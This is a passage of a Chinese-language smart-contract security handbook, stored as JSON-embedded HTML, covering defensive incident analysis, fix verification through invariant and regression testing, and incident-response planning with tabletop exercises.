思考题<\/h2>\n<ol>\n<li>你收到一份审计报告,结论是&quot;未发现严重问题&quot;。在把它作为上线依据之前,你要核对哪五件事?<\/li>\n<li>为什么&quot;已确认风险&quot;部分比&quot;已修复发现&quot;部分更需要你亲自判断?<\/li>\n<li>一个严重漏洞的赏金应该设多高?太低和太高分别有什么问题?(提示:和攻击者利用它的收益比较)<\/li>\n<\/ol>\n<p>下一章：<a href=\"#a08\" data-nav=\"a08\">A08 事故分析与防御性验证<\/a><\/p>\n"}, "a08": {"id": "a08", "file": "assessment/A08-reproduce-attacks.md", "title": "A08 事故分析与防御性验证", "group": "asm", "html": "<h1>A08 事故分析与防御性验证<\/h1>\n<blockquote class=\"\"><p>学习目标：读完本章，你能——<\/p>\n<ol>\n<li>拿到一个攻击交易哈希，用浏览器和交易追踪工具把&quot;发生了什么&quot;还原成一张时间线。<\/li>\n<li>把一起事故翻译成<strong>你自己评估时可复用的检查项和不变量<\/strong>。<\/li>\n<li>用不变量测试、模糊测试和分叉环境验证&quot;修复真的有效&quot;，而不是写攻击程序。<\/li>\n<li>知道用哪些合法的靶场和课程练手。<\/li>\n<\/ol>\n<p>前置章节：<a href=\"#c12\" data-nav=\"c12\">12 审计与测试<\/a>、<a href=\"#c13\" data-nav=\"c13\">13 事故案例库<\/a>、<a href=\"#a02\" data-nav=\"a02\">A02 评级与报告<\/a><br>交互实验：<a href=\"#lab-incident-explorer\" data-nav=\"lab-incident-explorer\" class=\"lab-link\">incident-explorer.html<\/a><\/p>\n<\/blockquote>\n<blockquote class=\"warn\"><p>⚠️ 本章的边界：目标是<strong>读懂已发生的事故、验证防御<\/strong>。不提供针对真实合约的攻击代码，也不鼓励在未授权的合约和主网上做任何尝试。评估工作里你需要的是&quot;证明这个洞存在并且修好了&quot;，通常不需要一个可运行的攻击程序。<\/p>\n<\/blockquote>\n<hr>\n<h2>1. 一句话理解<\/h2>\n<p><strong>评估人员不需要会&quot;发起攻击&quot;，需要会&quot;读懂攻击&quot;和&quot;证明防御&quot;。读懂一起事故，等于免费上了一堂课；证明一个修复有效，等于给上线门禁加了一条硬证据。<\/strong><\/p>\n<blockquote class=\"analogy\"><p>🎯 打个比方：这像<strong>消防员复盘火灾<\/strong>。<\/p>\n<ul>\n<li>他们不会为了学习去放火，而是到现场看起火点、蔓延路径、哪道防火门没关。<\/li>\n<li>复盘后做两件事：把&quot;起火点&quot;写进检查表（以后查同类隐患），再做防火演练验证新措施有效。<\/li>\n<\/ul>\n<p>比喻的局限：火灾现场会被破坏，链上现场永久公开、可逐笔回放，所以复盘比消防更精确，也更容易被&quot;事后诸葛&quot;误导——你要问的是&quot;事前有什么信号&quot;。<\/p>\n<\/blockquote>\n<hr>\n<h2>2. 读一笔攻击交易：五步法<\/h2>\n<p>拿到一个攻击交易哈希后，按顺序做：<\/p>\n<div class=\"mmd-wrap\"><pre class=\"mmd\">flowchart LR\n  A[&quot;① 定位&lt;br/&gt;交易、区块、发起人、受害合约&quot;] --&gt; B[&quot;② 看资金流&lt;br/&gt;谁付出、谁收到、多少&quot;]\n  B --&gt; C[&quot;③ 看调用树&lt;br/&gt;哪个函数被调用、顺序、深度&quot;]\n  C --&gt; D[&quot;④ 找&#39;不该发生&#39;的一步&lt;br/&gt;违反了什么假设&quot;]\n  D --&gt; E[&quot;⑤ 翻译成检查项&lt;br/&gt;我的评估怎么提前发现&quot;]<\/pre><\/div>\n<p><strong>读图要点：<\/strong><\/p>\n<ul>\n<li>①②只需要区块浏览器就够：看转账、事件日志、发起地址的资金来源（常来自混币器或新建地址）。<\/li>\n<li>③需要调用追踪：常用的有交易模拟与追踪工具（如 Phalcon、Tenderly 等）或浏览器自带的内部交易视图。看<strong>调用树<\/strong>比看反编译代码更快。<\/li>\n<li>④是核心：用一句话写出&quot;协议原本假设了什么，攻击者让这个假设不成立&quot;。<\/li>\n<li>⑤才是价值所在。没有这一步，复盘只是看热闹。<\/li>\n<li>局限：追踪工具看到的是&quot;发生了什么&quot;，不直接告诉你&quot;为什么协议这样设计&quot;。回到源码和官方事后报告去确认。<\/li>\n<\/ul>\n<h3>2.1 一张复盘表<\/h3>\n<p>每起事故用同一张表记录。表头固定，才能横向比较：<\/p>\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>字段<\/th>\n<th>填什么<\/th>\n<th>示例（取自本手册案例）<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>事故 / 日期 / 损失<\/td>\n<td>名称、时间、金额<\/td>\n<td>Euler Finance，2023-03，约 1.97 亿美元<\/td>\n<\/tr>\n<tr>\n<td>漏洞类别<\/td>\n<td>对应主线章节<\/td>\n<td>缺少健康检查（<a href=\"#c10\" data-nav=\"c10\">10 章<\/a>）<\/td>\n<\/tr>\n<tr>\n<td>被打破的假设<\/td>\n<td>一句话<\/td>\n<td>&quot;任何减少抵押品的路径最后都会检查健康因子&quot;<\/td>\n<\/tr>\n<tr>\n<td>触发条件<\/td>\n<td>需要什么前提<\/td>\n<td>某个函数遗漏了健康检查<\/td>\n<\/tr>\n<tr>\n<td>事前信号<\/td>\n<td>公开可见、事前能发现的迹象<\/td>\n<td>新增函数、审计未覆盖该模块<\/td>\n<\/tr>\n<tr>\n<td>对应检查项<\/td>\n<td>本手册哪个清单<\/td>\n<td><a href=\"#a04\" data-nav=\"a04\">A04 3.1 借贷<\/a><\/td>\n<\/tr>\n<tr>\n<td>对应不变量<\/td>\n<td>可测试的性质<\/td>\n<td>&quot;任何操作后，账户健康因子 ≥ 1&quot;<\/td>\n<\/tr>\n<tr>\n<td>修复<\/td>\n<td>官方怎么修<\/td>\n<td>补检查<\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<blockquote class=\"info\"><p>💡 注意：&quot;事前信号&quot;这一栏最难填，也最有价值。很多事故的信号其实早就公开：未审计的新代码、单签权限、过短的时间锁、被忽视的审计发现。<\/p>\n<\/blockquote>\n<hr>\n<h2>3. 从事故到不变量<\/h2>\n<p>不变量（Invariant）是&quot;任何操作序列后都必须成立&quot;的条件。事故几乎都能翻译成一条被打破的不变量：<\/p>\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>事故类型<\/th>\n<th>被打破的不变量（用自然语言写）<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>重入类<\/td>\n<td>一次外部调用返回时，相关账本余额与代币实际余额一致<\/td>\n<\/tr>\n<tr>\n<td>金库通胀<\/td>\n<td>每份份额对应的资产价格不会因单笔捐赠而大幅跳变<\/td>\n<\/tr>\n<tr>\n<td>借贷坏账<\/td>\n<td>任何用户操作结束后，其健康因子不低于清算线<\/td>\n<\/tr>\n<tr>\n<td>预言机操纵<\/td>\n<td>同一区块内价格偏离参考价不超过阈值<\/td>\n<\/tr>\n<tr>\n<td>桥伪造<\/td>\n<td>目标链铸造总量 ≤ 源链锁定总量<\/td>\n<\/tr>\n<tr>\n<td>权限类<\/td>\n<td>只有授权角色能改变权限和升级实现<\/td>\n<\/tr>\n<tr>\n<td>AMM<\/td>\n<td>每次交换后恒定乘积不减<\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<p><strong>写不变量的三条规则：<\/strong><\/p>\n<ol>\n<li>用业务语言先写一句话，再翻译成代码断言。写不出一句话，说明你没理解协议。<\/li>\n<li>不变量要覆盖<strong>所有<\/strong>入口函数，而不是只覆盖你担心的那个。<\/li>\n<li>好的不变量不依赖实现细节。它描述&quot;什么必须永远为真&quot;，而不是&quot;这行代码怎么写&quot;。<\/li>\n<\/ol>\n<blockquote class=\"info\"><p>💡 注意：把不变量交给模糊测试器去&quot;随机地、成千上万次地乱调用&quot;，让它替你寻找违反条件的调用序列。你的工作是把性质写对，不是手工构造攻击步骤。<\/p>\n<\/blockquote>\n<hr>\n<h2>4. 验证修复：回归与差异<\/h2>\n<p>声称&quot;已修复&quot;的发现，需要证据。评估人员验证修复的最小流程：<\/p>\n<ol>\n<li><strong>读修复补丁<\/strong>，只看相对审计版本的差异（Diff）。问：补丁是否只改了必要部分？有没有顺手改了别的？（&quot;只改了一行&quot;也要看，见 <a href=\"#a07\" data-nav=\"a07\">A07<\/a> 的警告。）<\/li>\n<li><strong>跑原有测试<\/strong>，确认没有回归。<\/li>\n<li><strong>补一条针对该发现的回归测试<\/strong>：用断言表达&quot;这个性质现在成立&quot;。测试应当在修复前失败、修复后通过——这是证明它有效的标准证据。<\/li>\n<li><strong>跑不变量与模糊测试<\/strong>足够久，覆盖修复周围的路径。<\/li>\n<li><strong>在分叉环境（Fork）验证配置<\/strong>：对已部署合约，用主网分叉读取权限、参数、实现地址，确认与预期一致（见 <a href=\"#a05\" data-nav=\"a05\">A05 第 5 节<\/a>）。<\/li>\n<li><strong>复审结论入档<\/strong>：写进报告的&quot;修复状态&quot;一栏，标明验证方式。<\/li>\n<\/ol>\n<div class=\"mmd-wrap\"><pre class=\"mmd\">flowchart TB\n  F[&quot;发现 F-07: 提币路径未检查 X&quot;] --&gt; P[&quot;修复补丁&quot;]\n  P --&gt; D[&quot;读差异 · 不引入新逻辑&quot;]\n  D --&gt; T[&quot;回归测试: 修复前失败 / 修复后通过&quot;]\n  T --&gt; I[&quot;不变量 + 模糊测试 持续运行&quot;]\n  I --&gt; R[&quot;复审通过 → 报告标记已验证&quot;]\n  D -. &quot;发现补丁改了别处&quot; .-&gt; BACK[&quot;退回 · 差异审计&quot;]<\/pre><\/div>\n<p><strong>读图要点：<\/strong><\/p>\n<ul>\n<li>&quot;修复前失败、修复后通过&quot;的测试，是修复有效的最直接证据。只&quot;修复后通过&quot;的测试，可能根本没测到那个问题。<\/li>\n<li>局限：测试只能证明你想到的性质。它不能证明不存在其他问题。所以复审不是&quot;测试全绿就结束&quot;。<\/li>\n<\/ul>\n<hr>\n<h2>5. 合法的练习与学习路径<\/h2>\n<p>想提高读代码、识别漏洞的熟练度，用这些<strong>专门设计的靶场和公开资料<\/strong>，而不是拿真实协议开刀：<\/p>\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>资源<\/th>\n<th>适合<\/th>\n<th>说明<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>Ethernaut（OpenZeppelin）<\/td>\n<td>入门<\/td>\n<td>一系列带漏洞的小合约关卡，在测试网练习<\/td>\n<\/tr>\n<tr>\n<td>Damn Vulnerable DeFi<\/td>\n<td>进阶<\/td>\n<td>DeFi 场景的漏洞挑战（借贷、治理、闪电贷等）<\/td>\n<\/tr>\n<tr>\n<td>Capture the Ether / 其他 CTF<\/td>\n<td>入门到进阶<\/td>\n<td>以夺旗形式练习<\/td>\n<\/tr>\n<tr>\n<td>审计竞赛的公开报告<\/td>\n<td>进阶<\/td>\n<td>读大量真实发现的描述，学习别人如何判断严重度<\/td>\n<\/tr>\n<tr>\n<td>已修复事故的官方事后报告<\/td>\n<td>全程<\/td>\n<td>项目方或安全公司发布的 post-mortem<\/td>\n<\/tr>\n<tr>\n<td>本手册 <a href=\"#labs\" data-nav=\"labs\" class=\"lab-link\">interactive<\/a> 七个实验<\/td>\n<td>全程<\/td>\n<td>浏览器内模拟，不涉及真实合约<\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<p><strong>练习时的规则：<\/strong><\/p>\n<ul>\n<li>只在靶场、本地环境或测试网中练习。<\/li>\n<li>不对未授权的主网合约做&quot;测试&quot;。即使你认为是善意，也可能触犯法律或被视为攻击。<\/li>\n<li>发现真实漏洞时，走披露流程：通过项目的漏洞赏金或安全联系渠道报告，不要自行利用。<\/li>\n<\/ul>\n<hr>\n<h2>6. 事后&quot;事前信号&quot;练习<\/h2>\n<p>选一起事故，不看结果，只看事前信息，练习&quot;如果是我做评估会怎么判&quot;：<\/p>\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>案例<\/th>\n<th>事前可见的信息<\/th>\n<th>你的评估会给出什么结论<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>Nomad 桥（2022）<\/td>\n<td>一次升级中把某个初始化值设成了零值<\/td>\n<td>部署与初始化参数评审；零值是否被当作&quot;已证明&quot;<\/td>\n<\/tr>\n<tr>\n<td>Ronin（2022）<\/td>\n<td>9 选 5 的验证人，其中多把由同一机构控制，一份临时授权未撤销<\/td>\n<td>签名人独立性不足<\/td>\n<\/tr>\n<tr>\n<td>PancakeBunny（2021）<\/td>\n<td>上线的是审计之后的新版本<\/td>\n<td>审计版本与上线版本不一致<\/td>\n<\/tr>\n<tr>\n<td>Bybit（2025）<\/td>\n<td>冷钱包是 Safe 多签，签名界面被篡改<\/td>\n<td>签名流程评估：独立解码、带外确认<\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<blockquote class=\"info\"><p>💡 注意：用<a href=\"#lab-incident-explorer\" data-nav=\"lab-incident-explorer\" class=\"lab-link\">事故浏览器<\/a>筛选类别，一次对比同一类的多起事故。看它们<strong>事前信号的共性<\/strong>，比记住单个案例更有用。<\/p>\n<\/blockquote>\n<hr>\n<h2>7. 评估报告里怎么写&quot;已验证&quot;<\/h2>\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>验证等级<\/th>\n<th>含义<\/th>\n<th>用在哪<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>已读代码<\/td>\n<td>人工审查，认为问题已修复<\/td>\n<td>低风险发现<\/td>\n<\/tr>\n<tr>\n<td>已回归测试<\/td>\n<td>有修复前失败、修复后通过的测试<\/td>\n<td>中高风险发现<\/td>\n<\/tr>\n<tr>\n<td>已不变量验证<\/td>\n<td>对应性质被持续的模糊/不变量测试覆盖<\/td>\n<td>高危、严重发现<\/td>\n<\/tr>\n<tr>\n<td>已分叉验证<\/td>\n<td>对已部署合约在分叉环境确认配置与行为<\/td>\n<td>上线门禁<\/td>\n<\/tr>\n<tr>\n<td>未验证<\/td>\n<td>仅项目方声明已修复<\/td>\n<td>必须明确标注，并在门禁中视为未关闭<\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<hr>\n<h2>8. 术语表<\/h2>\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>术语<\/th>\n<th>英文<\/th>\n<th>定义<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>事后报告<\/td>\n<td>Post-mortem<\/td>\n<td>事故发生后对原因、影响和改进的书面复盘<\/td>\n<\/tr>\n<tr>\n<td>调用树<\/td>\n<td>Call Trace<\/td>\n<td>一笔交易内部所有合约调用的层级记录<\/td>\n<\/tr>\n<tr>\n<td>不变量<\/td>\n<td>Invariant<\/td>\n<td>任何操作后都必须成立的条件<\/td>\n<\/tr>\n<tr>\n<td>回归测试<\/td>\n<td>Regression Test<\/td>\n<td>防止已修复的问题再次出现的测试<\/td>\n<\/tr>\n<tr>\n<td>模糊测试<\/td>\n<td>Fuzzing<\/td>\n<td>用大量随机输入寻找违反性质的情况<\/td>\n<\/tr>\n<tr>\n<td>分叉环境<\/td>\n<td>Fork<\/td>\n<td>复制某一时刻的链状态，在本地或云端读取与模拟<\/td>\n<\/tr>\n<tr>\n<td>差异审计<\/td>\n<td>Diff Audit<\/td>\n<td>只审相对已审版本的改动<\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<hr>\n<h2>9. 思考题<\/h2>\n<ol>\n<li>为什么评估人员验证修复时，要求&quot;修复前失败、修复后通过&quot;的测试？只有后半句的测试缺了什么？<\/li>\n<li>选一起本手册中的事故，填一遍第 2.1 节的复盘表，特别是&quot;事前信号&quot;一栏。<\/li>\n<li>项目方说&quot;这个发现已修复&quot;，但只给了一条口头回复。你在报告里应当怎么标注？门禁怎么处理？<\/li>\n<\/ol>\n<p>下一章：<a href=\"#a09\" data-nav=\"a09\">A09 应急响应<\/a><\/p>\n"}, "a09": {"id": "a09", "file": "assessment/A09-incident-response.md", "title": "A09 应急响应：评估之后，出事了怎么办", "group": "asm", "html": "<h1>A09 应急响应：评估之后，出事了怎么办<\/h1>\n<blockquote class=\"\"><p>学习目标：读完本章，你能——<\/p>\n<ol>\n<li>在上线前就把监控、权限、联系人和预案准备好，而不是出事后再找。<\/li>\n<li>用一张决策树判断是否暂停合约、是否联系白帽救援、是否通知交易所与发行方。<\/li>\n<li>组织一次桌面推演，并写出合格的事后复盘。<\/li>\n<\/ol>\n<p>前置章节：<a href=\"#a03\" data-nav=\"a03\">A03 交易所合约与钱包<\/a>、<a href=\"#a06\" data-nav=\"a06\">A06 运营与密钥安全<\/a>、<a href=\"#a08\" data-nav=\"a08\">A08 事故分析<\/a><br>模板：<a href=\"#t04\" data-nav=\"t04\">T04 上线门禁<\/a><\/p>\n<\/blockquote>\n<hr>\n<h2>1. 一句话理解<\/h2>\n<p><strong>事故中最稀缺的是时间。能在几分钟内暂停合约、联系对的人、做出决定，损失可能少一个数量级；这些能力必须在平时准备好，事故中来不及临时发明。<\/strong><\/p>\n<blockquote class=\"analogy\"><p>🎯 打个比方：应急响应像<strong>大楼的消防预案<\/strong>。<\/p>\n<ul>\n<li>火灾时没人有空翻手册。要提前划好疏散路线、装好喷淋、指定谁拉警报、谁联系消防队。<\/li>\n<li>平时做演习，是为了真起火时大家的动作是肌肉记忆。<\/li>\n<\/ul>\n<p>比喻的局限：火灾蔓延有物理速度，链上攻击可能在一个区块（几秒）内完成。所以链上的&quot;喷淋&quot;（自动限额、自动暂停）比&quot;人工拉警报&quot;更关键。<\/p>\n<\/blockquote>\n<hr>\n<h2>2. 准备阶段：上线前必须就绪<\/h2>\n<p>评估报告把这些作为<strong>上线门禁项<\/strong>（见 <a href=\"#t04\" data-nav=\"t04\">T04<\/a>）：<\/p>\n<div class=\"lv-figcap\"><span>图 · 暂停与升级权限分离<\/span><span class=\"new\">新增图解<\/span><\/div><div class=\"mmd-wrap\"><pre class=\"mmd\">flowchart TB\n  subgraph OK[\"分离\"]\n    P1[\"暂停权限&lt;br/&gt;少数可信角色 · 24 小时响应\"] --&gt; E1[\"几分钟内止血\"]\n    U1[\"升级权限&lt;br/&gt;走时间锁\"] --&gt; E2[\"升级难被滥用\"]\n  end\n  subgraph BAD[\"混在一起\"]\n    M[\"同一套权限\"] --&gt;|\"加时间锁\"| M1[\"暂停太慢\"]\n    M --&gt;|\"不加时间锁\"| M2[\"升级太容易\"]\n  end\n  LM[\"链上限额&lt;br/&gt;单笔 · 单位时间上限\"] --&gt; L1[\"一次性损失变可控\"]<\/pre><\/div>\n<p><strong>读图要点：<\/strong><\/p>\n<ul><li><strong>关键：<\/strong>暂停是应急，升级要时间锁，两者必须分开持有。<\/li><li><strong>出错点：<\/strong>权限混在一起时，只能在暂停太慢和升级太容易之间二选一。<\/li><li><strong>风险：<\/strong>暂停权交给需要多日凑齐的大多签，攻击发生时来不及止血。<\/li><li><strong>数据流：<\/strong>链上限额把一次被盗的上限提前写死。<\/li><\/ul>\n\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>准备项<\/th>\n<th>要求<\/th>\n<th>为什么<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>暂停能力<\/td>\n<td>有紧急暂停开关，且暂停权限与升级权限<strong>分离<\/strong><\/td>\n<td>暂停是应急，升级要时间锁；混在一起要么暂停太慢，要么升级太容易<\/td>\n<\/tr>\n<tr>\n<td>暂停权限持有人<\/td>\n<td>少数可信角色，能 24 小时响应；不是需要多日凑齐的大多签<\/td>\n<td>反应速度<\/td>\n<\/tr>\n<tr>\n<td>链上限额<\/td>\n<td>单笔、单位时间的提取/铸造上限<\/td>\n<td>把一次性损失变成可控<\/td>\n<\/tr>\n<tr>\n<td>监控与告警<\/td>\n<td>见下<\/td>\n<td>发现要比攻击者快<\/td>\n<\/tr>\n<tr>\n<td>联系人清单<\/td>\n<td>内部值班、外部审计方、安全公司、交易所/发行方/桥/预言机运营方<\/td>\n<td>出事时没时间找邮箱<\/td>\n<\/tr>\n<tr>\n<td>预案手册<\/td>\n<td>角色、权限、决策树、沟通模板<\/td>\n<td>避免临场混乱<\/td>\n<\/tr>\n<tr>\n<td>密钥与 break-glass<\/td>\n<td>紧急操作的密钥保管与启用流程<\/td>\n<td>不要在事故中才发现密钥找不到<\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<h3>2.1 监控什么<\/h3>\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>监控项<\/th>\n<th>触发条件示例<\/th>\n<th>对应风险<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>大额转出<\/td>\n<td>单笔或单位时间超过阈值<\/td>\n<td>资金被盗<\/td>\n<\/tr>\n<tr>\n<td>权限变更<\/td>\n<td>owner、admin、签名人、实现地址变化<\/td>\n<td>夺权、升级后门<\/td>\n<\/tr>\n<tr>\n<td>升级与初始化<\/td>\n<td>任何 upgrade 或 initialize 事件<\/td>\n<td>升级攻击<\/td>\n<\/tr>\n<tr>\n<td>价格异常<\/td>\n<td>预言机与参考价偏离、喷价<\/td>\n<td>操纵<\/td>\n<\/tr>\n<tr>\n<td>供应异常<\/td>\n<td>代币增发、桥两侧供应量不一致<\/td>\n<td>伪造铸造<\/td>\n<\/tr>\n<tr>\n<td>授权激增<\/td>\n<td>大量用户对同一未知地址授权<\/td>\n<td>前端被劫持<\/td>\n<\/tr>\n<tr>\n<td>冷钱包异动<\/td>\n<td>任何冷钱包的交易<\/td>\n<td>签名被骗<\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<blockquote class=\"info\"><p>💡 注意：告警要有<strong>人响应<\/strong>。告警发到没人看的频道，和没有告警一样。每条告警都要有负责人和响应时限。<\/p>\n<\/blockquote>\n<hr>\n<h2>3. 响应阶段：决策树<\/h2>\n<div class=\"mmd-wrap\"><pre class=\"mmd\">flowchart TB\n  S[&quot;收到告警 / 报告&quot;] --&gt; V{&quot;确认是真实事件?&lt;br/&gt;5-15 分钟内&quot;}\n  V -- &quot;误报&quot; --&gt; LOG[&quot;记录并调整阈值&quot;]\n  V -- &quot;真实或无法排除&quot; --&gt; P{&quot;能暂停吗?&quot;}\n  P -- &quot;能&quot; --&gt; PAUSE[&quot;暂停合约&lt;br/&gt;先止血&quot;]\n  P -- &quot;不能&quot; --&gt; ALT[&quot;降低暴露&lt;br/&gt;撤池、撤授权、下架充提&quot;]\n  PAUSE --&gt; A[&quot;评估范围与损失&quot;]\n  ALT --&gt; A\n  A --&gt; W{&quot;资金还在被转走?&quot;}\n  W -- &quot;是&quot; --&gt; NOTIFY[&quot;联系交易所/发行方/桥&lt;br/&gt;请求冻结与监控&quot;]\n  W -- &quot;否&quot; --&gt; COM[&quot;沟通与调查&quot;]\n  NOTIFY --&gt; COM\n  COM --&gt; R{&quot;是否与攻击者谈判?&lt;br/&gt;白帽协议&quot;}\n  R --&gt; FIX[&quot;修复 · 复审 · 恢复&quot;]\n  FIX --&gt; PM[&quot;事后复盘与披露&quot;]<\/pre><\/div>\n<p><strong>读图要点：<\/strong><\/p>\n<ul>\n<li><strong>先止血，后调查。<\/strong> 暂停合约几乎总是对的第一步；暂停的代价（业务中断）通常小于继续失血。<\/li>\n<li>在&quot;确认真实&quot;这一步不要拖太久。宁可暂停后发现误报，也不要观望到资金流出。<\/li>\n<li>对外联系的目标：交易所、稳定币发行方、桥、安全公司。它们可能协助冻结或标记地址，但<strong>没有保证<\/strong>，速度越快越有效。<\/li>\n<li>局限：这棵树是通用框架。具体协议要写进自己的预案（谁有权暂停？暂停后用户资金如何处理？）。<\/li>\n<\/ul>\n<h3>3.1 暂停之后<\/h3>\n<p>暂停不是终点，要预先回答：<\/p>\n<ul>\n<li>暂停期间用户能否提款？（有些设计会同时冻结提款，引发恐慌。）<\/li>\n<li>谁有权恢复，条件是什么？恢复前要完成什么验证？<\/li>\n<li>恢复后是否需要补偿机制或分期恢复？<\/li>\n<\/ul>\n<h3>3.2 与攻击者沟通<\/h3>\n<p>部分事故中，项目方向攻击者发布链上留言，提出白帽协议（通常是归还大部分资金、保留一笔赏金，并承诺不起诉）。这是一种常见做法，但：<\/p>\n<ul>\n<li>是否这样做、如何措辞，是<strong>法律与管理层的决定<\/strong>，应提前和法务沟通，不要由技术人员临时决定。<\/li>\n<li>一些攻击者是有组织的国家级团队，谈判成功率低。此时重点是追踪、联系交易所冻结。<\/li>\n<li>所有沟通留痕。<\/li>\n<\/ul>\n<hr>\n<h2>4. 沟通<\/h2>\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>对象<\/th>\n<th>内容<\/th>\n<th>时机<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>内部值班与管理层<\/td>\n<td>事实、已采取措施、下一步<\/td>\n<td>立即<\/td>\n<\/tr>\n<tr>\n<td>用户<\/td>\n<td>已知情况、风险提示、建议操作（如撤销授权）、下次更新时间<\/td>\n<td>确认后尽快，勿拖延<\/td>\n<\/tr>\n<tr>\n<td>合作方与相关协议<\/td>\n<td>影响范围、需要它们做的动作<\/td>\n<td>尽早<\/td>\n<\/tr>\n<tr>\n<td>监管 / 执法<\/td>\n<td>法务主导<\/td>\n<td>按合规要求<\/td>\n<\/tr>\n<tr>\n<td>公众<\/td>\n<td>事后复盘<\/td>\n<td>事态稳定后<\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<p><strong>沟通原则：<\/strong> 只陈述已确认的事实；不确定的明说&quot;正在调查&quot;；不在没有证据时指责具体对象；固定更新节奏（例如每 2 小时）。<\/p>\n<hr>\n<h2>5. 桌面推演（Tabletop）<\/h2>\n<p>不动真实系统，只围着桌子&quot;演&quot;一次事故，是性价比最高的演练。<\/p>\n<div class=\"lv-figcap\"><span>图 · 桌面推演循环<\/span><span class=\"new\">新增图解<\/span><\/div><div class=\"mmd-wrap\"><pre class=\"mmd\">flowchart LR\n  S1[\"选一个场景\"] --&gt; S2[\"主持人释放新情况&lt;br/&gt;每 10 分钟一条\"]\n  S2 --&gt; S3[\"参与者按预案行动&lt;br/&gt;说出理由\"]\n  S3 --&gt; S4[\"记录卡点&lt;br/&gt;联系人 · 权限 · 预案空白\"]\n  S4 --&gt;|\"继续推演\"| S2\n  S4 --&gt; S5[\"复盘\"]\n  S5 --&gt; S6[\"更新预案&lt;br/&gt;指定负责人和期限\"]\n  S6 -.-&gt;|\"下一次推演\"| S1<\/pre><\/div>\n<p><strong>读图要点：<\/strong><\/p>\n<ul><li><strong>数据流：<\/strong>信息逐步释放，逼参与者在不完整信息下做决定。<\/li><li><strong>关键：<\/strong>推演的产出是卡点清单，不是一次表演。<\/li><li><strong>出错点：<\/strong>卡点不变成带负责人和期限的改进项，推演就白做了。<\/li><li><strong>局限：<\/strong>推演不动真实系统，验证不了权限和密钥在实际中能不能用。<\/li><\/ul>\n\n<p><strong>一次 60–90 分钟的推演怎么做：<\/strong><\/p>\n<ol>\n<li>选一个场景，如：&quot;监控发现冷钱包发起一笔向陌生地址的大额转账，签名人称没有操作。&quot;<\/li>\n<li>主持人逐步释放信息（每 10 分钟一条新情况）：资金还在转？前端被改了？有人说被钓鱼了？<\/li>\n<li>参与者按预案行动并说出理由：谁拉暂停？联系谁？对用户怎么说？<\/li>\n<li>记录卡点：谁不知道联系人在哪？谁没有权限？预案哪里没写？<\/li>\n<li>复盘后更新预案，指定负责人和期限。<\/li>\n<\/ol>\n<p><strong>推演题库：<\/strong><\/p>\n<ul>\n<li>冷钱包异常转出（签名流程被攻破）。<\/li>\n<li>某代币合约被升级，owner 增发并砸盘。<\/li>\n<li>接入的第三方协议被攻破，我们有资金在里面。<\/li>\n<li>前端被劫持，用户在向攻击者授权。<\/li>\n<li>预言机喂价异常，借贷协议出现大额坏账。<\/li>\n<li>关键开发者终端被入侵。<\/li>\n<\/ul>\n<hr>\n<h2>6. 事后复盘（Post-mortem）<\/h2>\n<p>复盘的目的是学习，不是追责。一份合格的复盘包含：<\/p>\n<ol>\n<li><strong>摘要<\/strong>：发生了什么，影响多大。<\/li>\n<li><strong>时间线<\/strong>：精确到分钟，包含检测、决策、行动。<\/li>\n<li><strong>根因<\/strong>：技术根因 + 流程/组织根因（为什么没被提前发现）。<\/li>\n<li><strong>影响<\/strong>：资金、用户、业务。<\/li>\n<li><strong>做得好的 / 做得不好的<\/strong>。<\/li>\n<li><strong>改进项<\/strong>：每项有负责人和截止日期。<\/li>\n<li><strong>对评估体系的回流<\/strong>：这起事故暴露了哪个检查项缺失？更新 <a href=\"#a01\" data-nav=\"a01\">A01<\/a> 的清单和 <a href=\"#t01\" data-nav=\"t01\">T01<\/a>。<\/li>\n<\/ol>\n<blockquote class=\"info\"><p>💡 注意：把复盘当作评估体系的反馈回路。每起事故（无论是自家的还是行业的）都应当至少产生一个新的检查项或不变量，否则复盘只是文档。<\/p>\n<\/blockquote>\n<hr>\n<h2>7. 术语表<\/h2>\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>术语<\/th>\n<th>英文<\/th>\n<th>定义<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>应急响应<\/td>\n<td>Incident Response (IR)<\/td>\n<td>事故发生后的检测、遏制、恢复、复盘流程<\/td>\n<\/tr>\n<tr>\n<td>桌面推演<\/td>\n<td>Tabletop Exercise<\/td>\n<td>围桌模拟事故的演练<\/td>\n<\/tr>\n<tr>\n<td>暂停开关<\/td>\n<td>Pause / Circuit Breaker<\/td>\n<td>紧急停止合约关键功能的机制<\/td>\n<\/tr>\n<tr>\n<td>白帽协议<\/td>\n<td>Whitehat 